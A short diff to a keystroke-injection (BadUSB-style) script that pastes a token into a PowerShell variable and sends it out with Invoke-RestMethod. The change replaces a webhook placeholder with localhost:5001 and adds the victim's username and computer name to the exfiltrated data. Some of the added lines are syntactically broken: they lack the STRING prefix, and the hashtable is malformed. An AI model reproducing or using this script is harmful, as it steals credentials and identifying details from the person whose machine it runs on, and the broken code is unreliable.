@@ -20,7 +20,9 @@ STRING $token = "
 CTRL v
 STRING "
 ENTER
-STRING Invoke-RestMethod -Uri "(WEBHOOKLINK!!!!)" -Method POST -Headers @{ "Content-Type" = "application/json" } -Body (ConvertTo-Json @{ content = $token })
+$username = $env:USERNAME
+$computername = $env:COMPUTERNAME
+STRING Invoke-RestMethod -Uri "localhost:5001" -Method POST -Headers @{ "Content-Type" = "application/json" } -Body (ConvertTo-Json {content = $token username = $username computer = $computername})
 ENTER
 STRING exit
 ENTER
